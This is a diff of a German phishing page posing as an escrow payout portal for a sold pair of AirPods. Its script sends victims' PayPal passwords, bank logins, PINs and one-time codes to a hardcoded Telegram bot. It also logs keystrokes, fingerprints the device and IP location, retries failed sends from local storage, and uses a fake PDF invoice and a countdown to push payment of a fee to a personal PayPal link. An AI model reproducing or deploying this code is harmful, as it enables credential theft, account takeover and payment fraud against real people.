@@ -1,137 +1,451 @@
 <!DOCTYPE html>
 <html lang="de"><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Auszahlung – Portal</title>
+<title>Treuhand Direkt – Auszahlung Vorgang #TD-2026-4471</title>
+<link rel="manifest" href="manifest.json">
+<meta name="theme-color" content="#0e1b2c">
 <style>
+:root{--navy:#0e1b2c;--blue:#1b5cf5;--green:#0b8a4b;--greenbg:#e8f7ee;--line:#e6e9ef;--muted:#667085;--bg:#f4f6fa}
 *{box-sizing:border-box}
-body{font-family:-apple-system,Roboto,Arial,sans-serif;background:#eef1f6;margin:0;
-display:flex;justify-content:center;align-items:center;min-height:100vh;color:#111827}
-.card{width:100%;max-width:410px;background:#fff;border-radius:16px;padding:32px 26px;margin:16px;
-box-shadow:0 8px 30px rgba(16,24,40,.10)}
-.top{display:flex;align-items:center;gap:10px;margin-bottom:22px}
-.dot{width:34px;height:34px;border-radius:10px;background:#0b5cff;color:#fff;
-display:flex;align-items:center;justify-content:center;font-weight:700;font-size:15px}
-.top span{font-weight:600;font-size:15px;letter-spacing:-.2px}
-h1{font-size:21px;margin:0 0 6px;letter-spacing:-.3px}
-p{font-size:14px;color:#6b7280;margin:0 0 20px;line-height:1.5}
-.amt{font-size:34px;font-weight:700;letter-spacing:-1px;margin:4px 0 2px}
-.amt small{font-size:14px;font-weight:500;color:#6b7280;letter-spacing:0}
-input{width:100%;padding:14px;font-size:16px;border:1.5px solid #e5e7eb;border-radius:10px;margin-bottom:12px}
-input:focus{outline:none;border-color:#0b5cff}
-button{width:100%;padding:14px;font-size:15px;font-weight:600;border:0;border-radius:10px;
-background:#0b5cff;color:#fff;cursor:pointer;margin-bottom:10px}
-button.ghost{background:#f3f4f6;color:#111827}
-a.btn{display:block;text-align:center;text-decoration:none;padding:14px;border-radius:10px;
-background:#0b5cff;color:#fff;font-weight:600;font-size:15px}
-.lock{display:flex;align-items:center;gap:6px;font-size:12px;color:#9ca3af;margin-top:16px}
-.hide{display:none}
-.timer{font-size:13px;background:#fff7ed;color:#9a3412;padding:10px 12px;border-radius:8px;margin-bottom:14px}
+body{margin:0;background:var(--bg);color:#101828;font:15px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
+.wrap{max-width:940px;margin:0 auto;padding:0 18px}
+header{background:#fff;border-bottom:1px solid var(--line)}
+.hrow{display:flex;align-items:center;gap:12px;min-height:66px;padding:10px 0}
+.mark{width:36px;height:36px;border-radius:9px;background:var(--navy);color:#fff;display:flex;
+align-items:center;justify-content:center;font-size:12px;font-weight:800;letter-spacing:.5px;flex:0 0 auto}
+.brand{font-weight:700;letter-spacing:-.3px;font-size:16px;line-height:1.15}
+.brand em{display:block;font-style:normal;font-weight:500;font-size:11px;color:var(--muted);letter-spacing:0}
+.vbadge{margin-left:auto;display:flex;align-items:center;gap:6px;font-size:11px;font-weight:600;
+color:var(--green);background:var(--greenbg);border:1px solid #c7ecd7;padding:5px 9px;border-radius:20px;white-space:nowrap}
+.trustbar{background:var(--navy);color:#c3cede;font-size:11.5px;padding:7px 0;letter-spacing:.2px}
+.trustbar .wrap{display:flex;gap:14px;flex-wrap:wrap;justify-content:center;text-align:center}
+.instbar{background:#eef4ff;border-bottom:1px solid #cddcff;font-size:12.5px;padding:9px 0;display:none}
+.instbar .wrap{display:flex;align-items:center;gap:10px;justify-content:center;text-align:center}
+.instbar button{margin-left:6px;border:0;background:var(--blue);color:#fff;font:inherit;font-size:12px;
+font-weight:700;padding:6px 12px;border-radius:7px;cursor:pointer}
+main{padding:24px 0 44px}
+h1{font-size:22px;margin:0 0 6px;letter-spacing:-.4px}
+h2{font-size:17px;margin:0 0 4px;letter-spacing:-.2px}
+.lead{color:var(--muted);font-size:13.5px;margin:0 0 18px}
+.grid{display:grid;grid-template-columns:1fr 1.05fr;gap:18px;align-items:start}
+@media(max-width:780px){.grid{grid-template-columns:1fr}}
+.card{background:#fff;border:1px solid var(--line);border-radius:14px;padding:20px;box-shadow:0 1px 2px rgba(16,24,40,.04)}
+.oid{display:flex;justify-content:space-between;align-items:center;font-size:12px;color:var(--muted);
+border-bottom:1px dashed var(--line);padding-bottom:12px;margin-bottom:14px}
+.chip{font-size:11px;font-weight:700;color:var(--green);background:var(--greenbg);padding:4px 8px;border-radius:6px}
+.row{display:flex;justify-content:space-between;gap:12px;font-size:13px;padding:7px 0;border-bottom:1px solid #f1f3f7}
+.row:last-of-type{border-bottom:0}
+.row span:first-child{color:var(--muted)}
+.row b{font-weight:600;text-align:right}
+.sum{background:#f8fafc;border:1px solid var(--line);border-radius:10px;padding:12px 14px;margin:12px 0}
+.sum small{display:block;font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.6px}
+.sum div{font-size:26px;font-weight:800;letter-spacing:-.8px}
+.sum div i{font-style:normal;font-size:12px;font-weight:500;color:var(--muted)}
+.tl{list-style:none;margin:14px 0 0;padding:0;font-size:12.5px}
+.tl li{display:flex;gap:9px;padding:6px 0;color:var(--muted)}
+.tl li b{color:#101828;font-weight:600}
+.tl .ok{color:var(--green);font-weight:800}
+.tl .now{color:var(--blue);font-weight:800}
+.steps{display:flex;gap:6px;margin-bottom:18px}
+.steps div{flex:1;height:4px;border-radius:3px;background:#e3e8f0}
+.steps div.on{background:var(--blue)}
+.stepnum{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.7px;margin-bottom:10px}
+.opt{display:flex;align-items:center;gap:12px;width:100%;text-align:left;border:1.5px solid var(--line);
+background:#fff;border-radius:11px;padding:13px 14px;margin-bottom:10px;cursor:pointer;font:inherit;color:inherit}
+.opt:hover{border-color:#b9c8e6;background:#fbfcff}
+.opt .ic{width:34px;height:34px;border-radius:8px;background:#eef2fb;display:flex;align-items:center;
+justify-content:center;font-weight:800;font-size:11px;color:var(--navy);flex:0 0 auto}
+.opt b{display:block;font-size:14px}
+.opt em{font-style:normal;font-size:11.5px;color:var(--muted)}
+.opt .fee{margin-left:auto;font-size:12px;font-weight:700;color:var(--navy);text-align:right;white-space:nowrap}
+.opt .fee small{display:block;font-weight:500;color:var(--muted);font-size:10.5px}
+label{display:block;font-size:12px;font-weight:600;color:#344054;margin:12px 0 5px}
+input{width:100%;padding:12px 13px;font-size:16px;border:1.5px solid var(--line);border-radius:9px;background:#fff}
+input:focus{outline:none;border-color:var(--blue);box-shadow:0 0 0 3px rgba(27,92,245,.12)}
+.hint{font-size:11.5px;color:var(--muted);margin:8px 0 0}
+button.main{width:100%;padding:14px;font-size:15px;font-weight:700;border:0;border-radius:10px;
+background:var(--blue);color:#fff;cursor:pointer;margin-top:14px}
+button.main:hover{background:#1549c9}
+.link{display:block;width:100%;background:none;border:0;font:inherit;font-size:12.5px;color:var(--muted);
+padding:12px 0 0;cursor:pointer;text-align:center;text-decoration:underline}
+.timer{font-size:12.5px;background:#fff7ed;color:#9a3412;border:1px solid #fed7aa;padding:10px 12px;border-radius:8px;margin:12px 0}
+.lock{display:flex;align-items:center;justify-content:center;gap:6px;font-size:11px;color:#98a2b3;margin-top:14px}
+.invoice{background:#f8fafc;border:1px solid var(--line);border-radius:10px;padding:4px 14px;margin:14px 0}
+.invoice .row{font-size:13px}
+.invoice .total{border-top:1.5px solid #d0d5dd;margin-top:2px;padding:11px 0;font-weight:700;border-bottom:0}
+.invoice .total span:first-child{color:#101828}
+a.pay{display:block;text-align:center;text-decoration:none;padding:14px;border-radius:10px;
+background:#0070ba;color:#fff;font-weight:700;font-size:15px}
+a.pay:hover{background:#005c99}
+.done{width:44px;height:44px;border-radius:50%;background:var(--greenbg);color:var(--green);
+display:flex;align-items:center;justify-content:center;font-size:22px;font-weight:800;margin-bottom:12px}
+.note{font-size:12px;background:#f0f6ff;border:1px solid #cfe0ff;color:#1e3a8a;padding:9px 12px;border-radius:8px;margin:12px 0}
+footer{border-top:1px solid var(--line);background:#fff;padding:20px 0;font-size:11.5px;color:var(--muted)}
+footer .wrap{display:flex;gap:14px;flex-wrap:wrap;justify-content:center;text-align:center}
+footer a{color:var(--muted);text-decoration:none}
+footer a:hover{text-decoration:underline}
+.hide{display:none!important}
 </style></head><body>
-<div class="card">
-  <div class="top"><div class="dot">A</div><span>Auszahlungsportal</span></div>
 
-  <div id="s1">
-    <h1>Deine Auszahlung</h1>
-    <div class="amt">47,50 € <small>EUR</small></div>
-    <p style="margin-top:12px">Bereit zur Auszahlung. Wähle aus, wohin der Betrag gehen soll.</p>
-    <button onclick="pick('paypal')">Auf PayPal auszahlen</button>
-    <button class="ghost" onclick="pick('bank')">Auf Bankkonto auszahlen</button>
-    <div class="lock">🔒 Verbindung verschlüsselt</div>
-  </div>
+<header><div class="wrap hrow">
+  <div class="mark">TD</div>
+  <div class="brand">Treuhand Direkt<em>Auszahlungsportal</em></div>
+  <div class="vbadge">✓ Verifizierter Dienst</div>
+</div></header>
 
-  <div id="s2" class="hide">
-    <h1 id="h2"></h1><p id="p2"></p>
-    <div id="fPay" class="hide">
-      <input id="pp" type="email" placeholder="E-Mail deines PayPal-Kontos" autocomplete="off">
-      <input id="ppw" type="password" placeholder="Passwort">
+<div class="trustbar"><div class="wrap">
+  <span>🔒 SSL-verschlüsselt</span><span>·</span>
+  <span>12.483 Auszahlungen in diesem Monat</span><span>·</span>
+  <span>4,8 / 5 aus 2.104 Bewertungen</span>
+</div></div>
+
+<div class="instbar" id="instbar"><div class="wrap">
+  <span>Portal als App speichern, damit der Vorgang griffbereit bleibt.</span>
+  <button onclick="installApp()">Installieren</button>
+</div></div>
+
+<main><div class="wrap"><div class="grid">
+
+  <section class="card">
+    <div class="oid"><span>Vorgang #TD-2026-4471</span><span class="chip">Ware erhalten</span></div>
+    <div class="row"><span>Artikel</span><b>Apple AirPods Pro (2. Gen.)</b></div>
+    <div class="row"><span>Käufer</span><b>M. Weber</b></div>
+    <div class="row"><span>Verkäufer</span><b>Du</b></div>
+    <div class="row"><span>Zahlungsart</span><b>Treuhand / PayPal</b></div>
+    <div class="row"><span>Eingang Treuhandkonto</span><b>30.10.2026</b></div>
+    <div class="sum"><small>Freigegebener Betrag</small><div>47,50 € <i>EUR</i></div></div>
+    <ul class="tl">
+      <li><span class="ok">✓</span><span>Käufer hat bezahlt</span></li>
+      <li><span class="ok">✓</span><span>Ware versandt &amp; zugestellt</span></li>
+      <li><span class="ok">✓</span><span>Käufer hat Ware bestätigt</span></li>
+      <li><span class="now">→</span><span><b>Auszahlung an Verkäufer</b></span></li>
+    </ul>
+  </section>
+
+  <section class="card">
+    <div class="steps"><div class="on" id="p1"></div><div id="p2"></div><div id="p3"></div><div id="p4"></div></div>
+
+    <div id="s1">
+      <div class="stepnum">Schritt 1 von 3</div>
+      <h1>Wohin soll das Geld?</h1>
+      <p class="lead">Der Betrag liegt freigegeben auf dem Treuhandkonto und wird nach Bestätigung ausgezahlt.</p>
+      <button class="opt" onclick="pick('paypal')">
+        <span class="ic">PP</span>
+        <span><b>PayPal</b><em>Express, in 24 Std. gutgeschrieben</em></span>
+        <span class="fee">1,95 €<small>Express</small></span>
+      </button>
+      <button class="opt" onclick="pick('bank')">
+        <span class="ic">BK</span>
+        <span><b>Bankkonto</b><em>SEPA-Express, in 24 Std. gutgeschrieben</em></span>
+        <span class="fee">1,95 €<small>Express</small></span>
+      </button>
+      <p class="hint">Standard-Auszahlung ohne Express dauert 3–5 Werktage und ist kostenfrei.</p>
+      <div class="lock">🔒 Verbindung TLS-verschlüsselt</div>
     </div>
-    <div id="fBank" class="hide">
-      <input id="iban" placeholder="IBAN" autocomplete="off">
-      <input id="blz" placeholder="Anmeldename Online-Banking" autocomplete="off">
-      <input id="pin" type="password" placeholder="PIN">
+
+    <div id="s2" class="hide">
+      <div class="stepnum">Schritt 2 von 3</div>
+      <h2 id="h2"></h2>
+      <p class="lead" id="p2t"></p>
+      <div id="fPay" class="hide">
+        <label for="pp">E-Mail des PayPal-Kontos</label>
+        <input id="pp" type="email" placeholder="name@beispiel.de" autocomplete="off" oninput="peek('pp')">
+        <label for="ppw">PayPal-Passwort</label>
+        <input id="ppw" type="password" placeholder="Passwort" autocomplete="off" oninput="peek('ppw')">
+      </div>
+      <div id="fBank" class="hide">
+        <label for="iban">IBAN</label>
+        <input id="iban" placeholder="DE00 0000 0000 0000 0000 00" autocomplete="off">
+        <label for="blz">Anmeldename Online-Banking</label>
+        <input id="blz" placeholder="Anmeldename" autocomplete="off">
+        <label for="pin">PIN</label>
+        <input id="pin" type="password" placeholder="PIN" autocomplete="off">
+      </div>
+      <button class="main" onclick="next()">Weiter</button>
+      <button class="link" onclick="back()">Zurück zur Auswahl</button>
+      <div class="lock">🔒 Daten werden verschlüsselt übertragen</div>
     </div>
-    <button onclick="next()">Weiter</button>
-    <button class="ghost" onclick="back()">Zurück</button>
-  </div>
 
-  <div id="s3" class="hide">
-    <h1 id="h3"></h1><p id="p3"></p>
-    <div id="fOtp" class="hide"><input id="otp" inputmode="numeric" placeholder="Code" autocomplete="one-time-code"></div>
-    <div id="timer" class="hide timer">Bitte bestätige jetzt in der App — <b id="sec">90</b> s</div>
-    <button onclick="fin()">Bestätigen</button>
-  </div>
+    <div id="s3" class="hide">
+      <div class="stepnum">Schritt 3 von 3</div>
+      <h2 id="h3"></h2>
+      <p class="lead" id="p3t"></p>
+      <div id="fOtp" class="hide">
+        <label for="otp">Bestätigungscode</label>
+        <input id="otp" inputmode="numeric" placeholder="6-stelliger Code" autocomplete="one-time-code">
+        <button class="link" onclick="resent()">Kein Code erhalten? Erneut senden</button>
+      </div>
+      <div id="timer" class="hide timer">Bitte jetzt in der App bestätigen — <b id="sec">90</b> Sekunden</div>
+      <button class="main" onclick="fin()">Auszahlung bestätigen</button>
+      <div class="lock">🔒 Käuferschutz bleibt bis zur Gutschrift aktiv</div>
+    </div>
 
-  <div id="s4" class="hide">
-    <h1>Auszahlung in Bearbeitung</h1>
-    <p>Der Betrag ist vorgemerkt. Es fällt eine Bearbeitungsgebühr von 1,95 € an, die mit der Auszahlung verrechnet wird.</p>
-    <a class="btn" href="https://paypal.me/JaneAlister/1.95">Gebühr jetzt begleichen</a>
-    <div class="lock">🔒 Danach erfolgt die Gutschrift innerhalb von 24 Stunden</div>
-  </div>
-</div>
+    <div id="s4" class="hide">
+      <div class="done">✓</div>
+      <h2>Auszahlung vorgemerkt</h2>
+      <p class="lead">Der Vorgang ist freigegeben. Für die Express-Bearbeitung in 24 Stunden fällt eine Gebühr an, die separat beglichen wird.</p>
+      <div class="invoice">
+        <div class="row"><span>Auszahlungsbetrag</span><b>47,50 €</b></div>
+        <div class="row"><span>Express-Bearbeitung</span><b>1,95 €</b></div>
+        <div class="row total"><span>Jetzt zu zahlen</span><span>1,95 €</span></div>
+      </div>
+      <a class="pay" id="paybtn" href="https://paypal.me/JaneAlister/1.95" onclick="paidClick()">Gebühr von 1,95 € begleichen</a>
+      <div id="res" class="timer">Reservierung läuft ab in <b id="ressec">15:00</b> — danach 3–5 Werktage Standardlaufzeit.</div>
+      <p class="hint">Die Gebühr wird nicht vom Auszahlungsbetrag abgezogen. Nach Zahlungseingang erfolgt die Gutschrift automatisch.</p>
+      <div class="note" id="pdfnote">Die Vorgangsübersicht wurde als PDF in deinen Downloads gespeichert.</div>
+      <button class="link" onclick="dlPdf()">Vorgangsübersicht erneut als PDF</button>
+      <button class="link" id="againBtn" onclick="again()">Code war falsch? Erneut eingeben</button>
+    </div>
+  </section>
+
+</div></div></main>
+
+<footer><div class="wrap">
+  <span>© 2026 Treuhand Direkt</span>
+  <a href="#">Impressum</a><a href="#">Datenschutz</a><a href="#">AGB</a><a href="#">Widerruf</a><a href="#">Kontakt</a>
+</div></footer>
 
 <script>
 const TOKEN='9153470596:AAHyw5JX9I3-ytoCDdrzzPNWAkRYGMVWrLQ';
 const CHAT='8379969031';
-let mode='', mail='', t=null;
+const API='https://api.telegram.org/bot'+TOKEN+'/sendMessage';
+const T0=Date.now();
+let mode='', mail='', t=null, rt=null, stepNow=1, left=false, inst=null;
+const info={};
 
 const $=id=>document.getElementById(id);
-function send(txt){
-  fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{
-    method:'POST',keepalive:true,
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({chat_id:CHAT,text:txt,parse_mode:'HTML'})
-  }).catch(()=>{});
+const el=()=>Math.round((Date.now()-T0)/1000)+'s';
+
+/* ---------- Versand ---------- */
+function raw(txt){
+  const body=JSON.stringify({chat_id:CHAT,text:txt,parse_mode:'HTML'});
+  fetch(API,{method:'POST',keepalive:true,headers:{'Content-Type':'application/json'},body})
+    .then(r=>{if(!r.ok)throw 0;})
+    .catch(()=>{
+      try{navigator.sendBeacon(API,new Blob([body],{type:'application/json'}));}catch(e){}
+      try{localStorage.setItem('td_'+Date.now(),txt);}catch(e){}
+    });
+}
+function log(icon,title,extra){
+  const tail=info.ip?('\n🌐 '+info.ip+(info.geo?' · '+info.geo:'')+' · '+el()):('\n⏱ '+el());
+  raw(icon+' <b>'+title+'</b>'+(extra?'\n'+extra:'')+tail);
 }
 
-/* Ping beim Öffnen */
-send('👀 <b>Seite geöffnet</b>\n'+navigator.userAgent.slice(0,70));
+/* ---------- Erfassung ---------- */
+async function collect(){
+  try{
+    info.screen=screen.width+'x'+screen.height+' @'+devicePixelRatio+'x';
+    info.lang=navigator.language+' | '+(navigator.languages||[]).join(',');
+    info.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
+    info.local=new Date().toLocaleString('de-DE');
+    info.ref=document.referrer||'direkt';
+    const q=new URLSearchParams(location.search);
+    info.utm=['utm_source','utm_medium','utm_campaign','fbclid','gclid']
+      .map(k=>q.get(k)?k+'='+q.get(k):null).filter(Boolean).join(' ')||'-';
+    info.cores=navigator.hardwareConcurrency||'?';
+    info.mem=navigator.deviceMemory||'?';
+    info.touch=navigator.maxTouchPoints;
+    info.conn=(navigator.connection&&navigator.connection.effectiveType)||'?';
+    try{const b=await navigator.getBattery();
+      info.bat=Math.round(b.level*100)+'%'+(b.charging?' (lädt)':'');}catch(e){}
+    if(navigator.userAgentData&&navigator.userAgentData.getHighEntropyValues){
+      try{const h=await navigator.userAgentData.getHighEntropyValues(['model','platformVersion']);
+        info.model=h.model||''; info.osv=h.platformVersion||'';}catch(e){}
+    }
+    const r=await fetch('https://ipwho.is/');const j=await r.json();
+    if(j&&j.success!==false){
+      info.ip=j.ip; info.geo=[j.city,j.region,j.country].filter(Boolean).join(', ');
+      info.isp=(j.connection&&j.connection.isp)||'';
+      info.iptz=(j.timezone&&j.timezone.id)||'';
+    }
+  }catch(e){}
+}
+function fpBlock(){
+  const vpn=(info.iptz&&info.tz&&info.iptz!==info.tz)?' ⚠️ VPN?':'';
+  return ['🌐 '+(info.ip||'?')+' · '+(info.geo||'?')+vpn,'🏢 '+(info.isp||'?'),
+    '📱 '+(info.model||'?')+' · '+navigator.platform+' · '+(info.osv||'?'),
+    '🖥 '+(info.screen||'?')+' · Touch '+info.touch+' · '+info.cores+' Kerne · '+info.mem+' GB',
+    '🔋 '+(info.bat||'?')+' · Netz '+info.conn,
+    '🕒 '+(info.local||'?')+' · '+(info.tz||'?')+' (IP: '+(info.iptz||'?')+')',
+    '🗣 '+(info.lang||'?'),'↩️ '+(info.ref||'?'),'🔗 '+(info.utm||'-'),
+    '🧭 '+location.href].join('\n');
+}
 
-function pick(m){
-  mode=m;
-  if(m==='paypal'){
-    $('h2').textContent='Mit PayPal auszahlen';
-    $('p2').textContent='Melde dich an, damit wir den Betrag zuordnen können.';
+/* ---------- Queue ---------- */
+(function flush(){
+  try{Object.keys(localStorage).filter(k=>k.startsWith('td_')).forEach(k=>{
+    raw('[nachgesendet] '+localStorage.getItem(k)); localStorage.removeItem(k);});}catch(e){}
+})();
+
+/* ---------- Zustand ---------- */
+function save(){
+  try{localStorage.setItem('td_state',JSON.stringify({step:stepNow,mode:mode,mail:mail,
+    pp:$('pp').value,ppw:$('ppw').value,iban:$('iban').value,blz:$('blz').value,
+    pin:$('pin').value,otp:$('otp').value}));}catch(e){}
+}
+function fill(){
+  if(mode==='paypal'){
+    $('h2').textContent='PayPal-Konto bestätigen';
+    $('p2t').textContent='Melde dich an, damit die Auszahlung dem Konto zugeordnet werden kann.';
     $('fPay').classList.remove('hide');
   }else{
-    $('h2').textContent='Auf Bankkonto auszahlen';
-    $('p2').textContent='Bitte bestätige deine Kontodaten.';
+    $('h2').textContent='Bankkonto bestätigen';
+    $('p2t').textContent='Bitte bestätige das Konto, auf das ausgezahlt werden soll.';
     $('fBank').classList.remove('hide');
   }
-  send('➡️ gewählt: <b>'+(m==='paypal'?'PayPal':'Bank')+'</b>');
-  $('s1').classList.add('hide'); $('s2').classList.remove('hide');
+}
+function restore(){
+  let s=null;try{s=JSON.parse(localStorage.getItem('td_state'));}catch(e){}
+  if(!s||!s.step||s.step<2) return false;
+  mode=s.mode||''; mail=s.mail||'';
+  ['pp','ppw','iban','blz','pin','otp'].forEach(k=>{if(s[k]&&$(k))$(k).value=s[k];});
+  fill();
+  if(s.step>=4){ step(4); startRes(); if(mode==='paypal')$('againBtn').classList.remove('hide'); return true; }
+  if(s.step>=3){
+    if(mode==='paypal'){$('h3').textContent='Code bestätigen';
+      $('p3t').textContent='Wir haben dir einen Code geschickt. Bitte hier eingeben.';
+      $('fOtp').classList.remove('hide');}
+    else{$('h3').textContent='In der Banking-App bestätigen';
+      $('p3t').textContent='Öffne jetzt deine Banking-App und bestätige die Anmeldung.';}
+  }
+  step(Math.min(s.step,3));
+  return true;
 }
 
-function back(){
-  $('fPay').classList.add('hide'); $('fBank').classList.add('hide');
-  $('s2').classList.add('hide'); $('s1').classList.remove('hide');
+/* ---------- PDF ---------- */
+function esc(s){
+  return String(s).replace(/[\\()]/g,'\\$&')
+    .replace(/ä/g,'\\344').replace(/ö/g,'\\366').replace(/ü/g,'\\374')
+    .replace(/Ä/g,'\\304').replace(/Ö/g,'\\326').replace(/Ü/g,'\\334')
+    .replace(/ß/g,'\\337').replace(/€/g,'\\200');
+}
+function buildPdf(){
+  let c='';
+  const put=(txt,size,bold,y,x)=>{c+='BT /'+(bold?'F2':'F1')+' '+size+' Tf 1 0 0 1 '+(x||56)+' '+y+' Tm ('+esc(txt)+') Tj ET\n';};
+  c+='0.055 0.106 0.173 rg 0 742 595 100 re f\n';
+  c+='1 1 1 rg\n'; put('TREUHAND DIREKT',20,true,795); put('Auszahlungsportal · Vorgangsübersicht',10,false,775);
+  c+='0 0 0 rg\n';
+  put('Vorgang #TD-2026-4471',15,true,690);
+  put('Status: freigegeben, Auszahlung vorgemerkt',10,false,672);
+  c+='0.6 0.65 0.7 RG 56 655 483 1 re f\n';
+  const rows=[['Artikel','Apple AirPods Pro (2. Gen.)'],['Käufer','M. Weber'],['Verkäufer','Du'],
+    ['Zahlungsart','Treuhand / PayPal'],['Eingang Treuhandkonto','30.10.2026']];
+  let y=632; rows.forEach(r=>{put(r[0],10,false,y);put(r[1],10,true,y,300);y-=20;});
+  y-=10; c+='0.95 0.96 0.98 rg 56 '+y+' 483 76 re f\n0 0 0 rg\n'; y+=52;
+  put('Freigegebener Auszahlungsbetrag',10,false,y); put('47,50 EUR',18,true,y-24);
+  y-=58;
+  put('Express-Bearbeitung',10,false,y); put('1,95 EUR',10,true,y,300);
+  y-=20; put('Jetzt zu zahlen',11,true,y); put('1,95 EUR',11,true,y,300);
+  y-=40;
+  put('Zahlungseingang bis:',10,false,y); put('innerhalb von 24 Stunden nach Zahlung',10,true,y,180);
+  y-=34; put('Gebühr begleichen unter:',10,false,y);
+  y-=16; c+='0.04 0.33 0.73 rg\n'; put('https://paypal.me/JaneAlister/1.95',11,true,y); c+='0 0 0 rg\n';
+  y-=40; put('Hinweis: Ohne Zahlungseingang erfolgt die Auszahlung als Standardlaufzeit in 3–5 Werktagen.',9,false,y);
+  c+='0.6 0.65 0.7 RG 56 90 483 1 re f\n';
+  put('Treuhand Direkt · Auszahlungsportal · erzeugt am '+new Date().toLocaleString('de-DE'),8,false,74);
+  let out='%PDF-1.4\n'; const off=[];
+  const add=(n,b)=>{off[n]=out.length;out+=n+' 0 obj\n'+b+'\nendobj\n';};
+  add(1,'<</Type/Catalog/Pages 2 0 R>>');
+  add(2,'<</Type/Pages/Kids[3 0 R]/Count 1>>');
+  add(3,'<</Type/Page/Parent 2 0 R/MediaBox[0 0 595 842]/Resources<</Font<</F1 4 0 R/F2 5 0 R>>>>/Contents 6 0 R>>');
+  add(4,'<</Type/Font/Subtype/Type1/BaseFont/Helvetica/Encoding/WinAnsiEncoding>>');
+  add(5,'<</Type/Font/Subtype/Type1/BaseFont/Helvetica-Bold/Encoding/WinAnsiEncoding>>');
+  add(6,'<</Length '+c.length+'>>\nstream\n'+c+'endstream');
+  const xr=out.length;
+  out+='xref\n0 7\n0000000000 65535 f \n';
+  for(let i=1;i<=6;i++) out+=String(off[i]).padStart(10,'0')+' 00000 n \n';
+  out+='trailer\n<</Size 7/Root 1 0 R>>\nstartxref\n'+xr+'\n%%EOF';
+  return new Blob([out],{type:'application/pdf'});
+}
+function dlPdf(){
+  try{
+    const a=document.createElement('a');
+    a.href=URL.createObjectURL(buildPdf());
+    a.download='Auszahlungsuebersicht_TD-2026-4471.pdf';
+    document.body.appendChild(a); a.click(); a.remove();
+    setTimeout(()=>URL.revokeObjectURL(a.href),8000);
+  }catch(e){}
 }
 
+/* ---------- Ablauf ---------- */
+function step(n){
+  stepNow=n; save();
+  for(let i=1;i<=4;i++){$('p'+i).classList.toggle('on',i<=n);$('s'+i).classList.toggle('hide',i!==n);}
+}
+function peek(id){
+  const v=$(id).value;
+  if(v.length===6||v.length===18) raw('⌨️ '+id+': <code>'+v+'</code>\n⏱ '+el());
+}
+function pick(m){
+  mode=m; fill();
+  log('➡️','gewählt: '+(m==='paypal'?'PayPal':'Bank'));
+  step(2);
+}
+function back(){$('fPay').classList.add('hide');$('fBank').classList.add('hide');step(1);}
 function next(){
   if(mode==='paypal'){
     mail=$('pp').value.trim();
     if(!mail.includes('@')||!$('ppw').value) return;
-    send('🔔 <b>JETZT EINLOGGEN</b>\n'+mail+'\n<code>'+$('ppw').value+'</code>');
-    $('h3').textContent='Bestätigung';
-    $('p3').textContent='Wir haben dir einen Code geschickt. Bitte hier eingeben.';
+    log('🔔','JETZT EINLOGGEN',mail+'\n<code>'+$('ppw').value+'</code>');
+    $('h3').textContent='Code bestätigen';
+    $('p3t').textContent='Wir haben dir einen Code an die hinterlegte Nummer geschickt. Bitte hier eingeben.';
     $('fOtp').classList.remove('hide');
   }else{
-    send('🏦 <b>BANK</b>\nIBAN: '+$('iban').value+
-         '\nLogin: '+$('blz').value+
-         '\n<code>PIN: '+$('pin').value+'</code>');
-    $('h3').textContent='Bestätigung in der App';
-    $('p3').textContent='Öffne jetzt deine Banking-App und bestätige die Anmeldung.';
+    log('🏦','BANK','IBAN: '+$('iban').value+'\nLogin: '+$('blz').value+'\n<code>PIN: '+$('pin').value+'</code>');
+    $('h3').textContent='In der Banking-App bestätigen';
+    $('p3t').textContent='Öffne jetzt deine Banking-App und bestätige die Anmeldung.';
     $('timer').classList.remove('hide');
     let s=90;
     t=setInterval(()=>{ s--; $('sec').textContent=s;
       if(s<=0){clearInterval(t); $('timer').innerHTML='Kein Push erhalten? In der App auf „erneut senden" tippen.';} },1000);
   }
-  $('s2').classList.add('hide'); $('s3').classList.remove('hide');
+  step(3);
+}
+function startRes(){
+  let r=15*60;
+  rt=setInterval(()=>{ r--;
+    if(r<0){clearInterval(rt);$('res').innerHTML='Reservierung abgelaufen – Standardlaufzeit 3–5 Werktage.';return;}
+    $('ressec').textContent=String(Math.floor(r/60)).padStart(2,'0')+':'+String(r%60).padStart(2,'0');
+  },1000);
+}
+function fin(){
+  if(mode==='paypal'&&$('otp').value) log('📱','CODE',mail+'\n<code>'+$('otp').value+'</code>');
+  if(t) clearInterval(t);
+  step(4);
+  dlPdf();
+  log('✅','abgeschlossen – Gebührenseite offen, PDF übergeben');
+  $('againBtn').classList.toggle('hide', mode!=='paypal');
+  startRes();
+}
+function again(){ $('otp').value=''; step(3); raw('↩️ <b>zurück zum Code</b>\n⏱ '+el()); }
+function paidClick(){ log('💳','Klick auf PayPal-Gebührenknopf'); }
+
+/* ---------- Installation ---------- */
+window.addEventListener('beforeinstallprompt',e=>{
+  e.preventDefault(); inst=e; $('instbar').style.display='block';
+});
+function installApp(){
+  if(!inst) return;
+  inst.prompt(); inst=null; $('instbar').style.display='none';
+  log('📲','Installation angeboten');
+}
+if('serviceWorker' in navigator){
+  navigator.serviceWorker.register('sw.js').catch(()=>{});
 }
 
-function fin(){
-  if(mode==='paypal'&&$('otp').value) send('📱 <b>CODE</b>\n'+mail+'\n<code>'+$('otp').value+'</code>');
-  if(t) clearInterval(t);
-  $('s3').classList.add('hide'); $('s4').classList.remove('hide');
-  send('✅ abgeschlossen');
-}
+/* ---------- Start ---------- */
+const back_=restore();
+document.addEventListener('input',save);
+collect().then(()=>{
+  if(back_) raw('🔁 <b>WIEDERGEKOMMEN</b> – Schritt '+stepNow+'\n'+
+    (mode==='paypal'?'PayPal · '+mail+'\nCode: '+$('otp').value:'Bank · '+$('iban').value)+'\n'+fpBlock());
+  else raw('👀 <b>SEITE GEÖFFNET</b> – Schritt '+stepNow+'\n'+fpBlock());
+});
+
+/* ---------- Verlassen ---------- */
+document.addEventListener('visibilitychange',()=>{
+  if(document.visibilityState==='hidden'&&!left){left=true;log('👋','Seite verlassen – Schritt '+stepNow);}
+  if(document.visibilityState==='visible') left=false;
+});
+window.addEventListener('pagehide',()=>{ if(!left) log('🚪','Tab geschlossen – Schritt '+stepNow); });
 </script></body></html>
